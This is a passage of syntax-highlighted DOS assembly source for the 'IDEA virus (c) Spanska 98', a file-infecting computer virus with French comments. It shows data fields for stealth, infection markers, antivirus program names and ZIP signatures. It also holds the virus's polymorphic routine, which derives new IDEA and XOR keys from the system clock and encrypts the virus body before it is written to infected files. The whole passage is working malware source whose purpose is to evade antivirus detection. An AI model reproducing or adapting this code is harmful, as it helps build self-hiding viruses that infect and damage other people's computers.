</span><span class="sc5">size_for_stealth</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">enuns7</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">f_ext</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc0">
</span><span class="sc5">f_attrib</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0">
</span><span class="sc5">f_name</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">f_time</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">f_date</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">f_handle</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exehead</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0aah</span><span class="sc4">)</span><span class="sc0">  
</span><span class="sc5">av_liste</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"TBVIAVNAVSFIF-FVIVDRSCGUCO"</span><span class="sc0">
</span><span class="sc5">zip_liste</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PKARRALHBA"</span><span class="sc0">
</span><span class="sc5">stealth_non</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ajuste_exe</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crc_file</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"anti-vir.dat"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">marqueur_inf</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">push_all_tmp</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">copyright</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IDEA virus (c) Spanska 98"</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" Thx to Rajaat (poly), F Mirza (IDEA), Wild Worker (zip), Solar D (road)"</span><span class="sc0">

</span><span class="sc1">;************************************************************</span><span class="sc0">
</span><span class="sc1">;********** CRYPTAGE et MUTATION ******************</span><span class="sc0">
</span><span class="sc1">;************************************************************</span><span class="sc0">
</span><span class="sc1">; en entrée: com_fse a 1 si c'est un com, taille_fse ajustée; rien sur le stack</span><span class="sc0">
</span><span class="sc1">; au retour: cx= taille a enregistrer a la fin du fichier</span><span class="sc0">

</span><span class="sc5">poly_from_resident</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">poly</span><span class="sc0">

</span><span class="sc5">poly_from_runtime</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">poly</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--------------------chgt clef IDEA------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;13x4 = 52 words</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">change_clef</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">                     </span><span class="sc1">;horloge</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;ch=hr, cl=min, dh=sec, dl=click</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;1er word XOR avec horloge</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">                   
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;2eme word XOR avec horloge</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;inversion 1er/2eme</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;stockage</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;3eme word ADD avec horloge</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;4eme word ADD avec horloge</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;inversion 1er/2eme</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">;stockage</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">;on revient au debut</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                       </span><span class="sc1">;des 4 words</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">aleat</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8405h</span><span class="sc0">
     </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">;dx aleatoire</span><span class="sc0">
     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">aleat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">xor_aleat</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;on XORe chaque word avec dx</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">xor_aleat</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">change_clef</span><span class="sc0">
</span><span class="sc1">;----met la clef a un des 2 offsets possibles</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">                     </span><span class="sc1">;horloge</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;ch=hr, cl=min, dh=sec, dl=click</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30d</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">zone_basse</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">zone_basse</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ou_est_la_clef</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;--------------------chgt clef NOKEY------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">             </span><span class="sc1">;horloge</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;ch=heure, cl=minute, dh=secondes, dl= 1/100 sec</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0">               </span><span class="sc1">;on ne garde que les 6 premiers bits</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_xor</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">            </span><span class="sc1">;donc 0 &lt;clef xor&lt;63</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">               </span><span class="sc1">;on ne garde que les 5 premiers bits</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_sub</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">            </span><span class="sc1">;donc 0 &lt;clef add&lt;31</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">               </span><span class="sc1">;on ne garde que les 3 premiers bits</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_ror</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">            </span><span class="sc1">;donc 0 &lt;clef ror&lt;7</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00001111b</span><span class="sc0">               </span><span class="sc1">;on ne garde que les 4 premiers bits</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_xor2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">;donc 0 &lt;clef xor2&lt;15</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_xor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_sub</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_ror</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_xor2</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc1">;----stocker le CRC à un offset variable</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                 </span><span class="sc1">;le mettre sur le stack</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">                            </span><span class="sc1">;renvoie un al aléatoire</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000111b</span><span class="sc0">                       </span><span class="sc1">;0&lt;al&lt;7</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                              
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;cx = al</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crc_clef</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">                               </span><span class="sc1">;on remplit la zone de 0</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                  </span><span class="sc1">;récup du CRC</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;on le stocke</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------copie du corps dans le heap-------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage_FSE</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">debut_cryptage_FSE</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-------------cryptage IDEA du corps dans le heap-------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">iv</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xBuffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage_IDEA</span><span class="sc4">-</span><span class="sc5">debut_cryptage_FSE</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;offset debut pour cryptage</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100d</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                  </span><span class="sc1">;savoir ou est la clef</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suitezob</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;offset clef 52</span><span class="sc0">

</span><span class="sc5">suitezob</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage_IDEA</span><span class="sc4">-</span><span class="sc5">debut_cryptage_IDEA</span><span class="sc0">   </span><span class="sc1">;nb d'octets a crypter</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">;on ajuste taille a l'octet suivant</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;on divise par 8</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;taille octets lus /8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;donc nb de blocs de 8 oct a crypter</span><span class="sc0">
</span><span class="sc5">Block2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;sauve cx, si, di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> 
</span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xBuffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; di-&gt;buffer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IDEA</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; si-&gt;data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">EnFeedback</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">EnFeedback</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">;recup cx, si, di</span><span class="sc0">
